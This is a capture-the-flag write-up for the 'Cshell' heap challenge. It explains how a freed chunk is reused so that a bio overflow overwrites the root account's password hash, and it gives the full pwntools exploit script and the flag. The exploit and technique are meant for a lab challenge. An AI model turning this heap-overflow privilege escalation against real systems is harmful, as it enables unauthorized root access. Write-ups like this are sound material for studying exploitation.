# Cshell

## Challenge

interactive menu and login prompt

user can create an account with a bio, stored on the heap

there is a preexisting root account and other user accounts

2 old user accounts have been freed

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

specify a bio length such that the new user buf is allocated in the old `Eric_buff` region

`fgets` reads 201 bytes, which can now overwrite the `struct users *root` data

overwrite the hashed password with a known hash, the salt is the same between users

logout of the user account, login to the root account and spawn a shell

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.be.ax --port 5001 Cshell
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('Cshell')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.be.ax'
port = int(args.PORT or 5001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendlineafter(b"Enter a username up to 8 characters long.", b"username")
io.sendlineafter(b"Create a password.", b"password")
io.sendlineafter(b"How many characters will your bio be (200 max)?", str(0x80).encode())

payload = flat({
    0x5188f3 - 0x518838: b"13tuGn7XXnAgQ",
    })

io.sendafter(b"Great, please type your bio.", payload)
io.sendlineafter(b"Choice > ", b"1")
io.sendlineafter(b"Username:", b"root")
io.sendlineafter(b"Password:", b"password")
io.sendlineafter(b"Choice > ", b"3")
io.sendline(b"cat flag.txt")

io.interactive()
```

## Flag

`corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}`
